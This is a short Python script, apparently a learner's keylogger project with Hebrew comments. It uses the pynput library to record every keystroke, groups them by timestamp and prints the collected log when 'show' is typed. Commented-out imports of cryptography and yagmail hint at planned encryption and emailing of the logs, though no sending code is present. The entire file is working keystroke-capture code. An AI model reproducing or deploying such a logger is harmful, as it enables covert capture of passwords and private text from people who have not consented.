from pynput.keyboard import Key, Listener
# import cryptography
# import yagmail
import datetime
import time

count = 0
pressed_keys = []
log_dict = {}

def on_press(key):
    global pressed_keys, count

    pressed_keys.append(str(key))
    print(pressed_keys[-4:])
    if pressed_keys[-4:] == ["'s'","'h'","'o'","'w'"]:
        print(log_dict)

    count += 1
    print('{0} pressed', format(key))

    if count >= 10:
        count = 0
        write_file(pressed_keys)
        pressed_keys = []

def write_file(keys):
    ct = datetime.datetime.now()
    now = ct.strftime("%d-%m-%y %H:%M ")
    data_str = ''
    ct = datetime.datetime.now()
    for key in keys:
        k = str(key).replace("'","")

        if k.find('space') > 0:
                data_str += ' '
        elif k.find('Key') == -1:
                data_str += k
        else:
             continue
    if now in log_dict:
        log_dict[now] += data_str
    else:
        log_dict[now] = data_str
    print(log_dict)


def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print(log_dict)

    # if type(key) == keyboard.Key:
    #     if key == keyboard.Key.space:
    #         pressed_key.append(" ")
    #     elif key == keyboard.Key.enter:
    #         pressed_key.append("\n")
    #     elif key == keyboard.Key.backspace and pressed_key:
    #         del pressed_key[-1]
    #     elif key == keyboard.Key.tab:
    #         pressed_key.append("    ")
    # else:
    #     pressed_key.append(str(key))

# את הפקודות ייבאתי מ- https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard

# key_listener= keyboard.Listener(on_press=typing)
# key_listener.start()
# # הוספתי כאן מגבלת זמן להרצת התוכנה כי לא הצלחתי לעשות יציאה נוחה
# time.sleep(60)
# key_listener.stop()


# text= ''.join(pressed_key)
# print (text)
